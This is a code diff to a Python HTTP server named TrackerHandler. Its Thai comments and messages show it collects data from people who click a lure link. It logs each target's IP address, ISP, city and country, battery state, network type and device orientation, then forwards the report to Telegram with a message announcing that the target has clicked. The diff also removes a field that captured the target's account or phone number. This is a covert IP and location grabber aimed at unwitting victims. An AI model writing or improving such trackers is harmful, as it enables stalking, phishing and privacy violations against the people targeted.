@@ -83,9 +83,9 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
             now = datetime.now(tz_th)
             dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
             
-            # ดึงข้อมูล IP และ แบตเตอรี่
-            ip_info = device_info.get('ip', {})
-            battery_info = device_info.get('battery', {})
+            # ดึงข้อมูล IP และ แบตเตอรี่ (ป้องกันกรณีเป็น None)
+            ip_info = device_info.get('ip') or {}
+            battery_info = device_info.get('battery') or {}
             network_type = device_info.get('network', 'Unknown')
             
             # จัดฟอร์แมตข้อมูลแบตเตอรี่
@@ -94,16 +94,11 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
                 status = "⚡ กำลังชาร์จ" if battery_info.get('charging') else "🔋 ไม่ได้ชาร์จ"
                 bat_text = f"{battery_info.get('level', 0)}% ({status})"
 
-            username = data.get('username', '').strip()
-            if not username:
-                username = 'ไม่ระบุ (ไม่ได้กรอก)'
-            
             orientation = device_info.get('orientation', 'ไม่ทราบ (ไม่มีเซ็นเซอร์หรือไม่อนุญาต)')
             
             print('\n========================================')
             print('🚨 มีคนกดลิ้งค์และส่งข้อมูลมาแล้ว! 🚨')
             print(f'🕒 วันและเวลา: {dt_string}')
-            print(f'👤 บัญชี/เบอร์โทร: {username}')
             print(f'🌐 IP Address: {ip_info.get("ip", "N/A")}')
             print(f'🏢 เครือข่าย (ISP): {ip_info.get("org", "N/A")}')
             print(f'📍 พื้นที่ (IP Location): {ip_info.get("city", "N/A")}, {ip_info.get("region", "N/A")}, {ip_info.get("country_name", "N/A")}')
@@ -122,7 +117,6 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
             # สร้างข้อความสำหรับส่งเข้า Telegram
             tg_message = (
                 f"🚨 เป้าหมายกดลิงก์แล้ว!\n\n"
-                f"👤 บัญชีเป้าหมาย: {username}\n"
                 f"🕒 เวลา: {dt_string}\n"
                 f"🌐 IP: {ip_info.get('ip', 'N/A')}\n"
                 f"🏢 เครือข่าย: {ip_info.get('org', 'N/A')}\n"
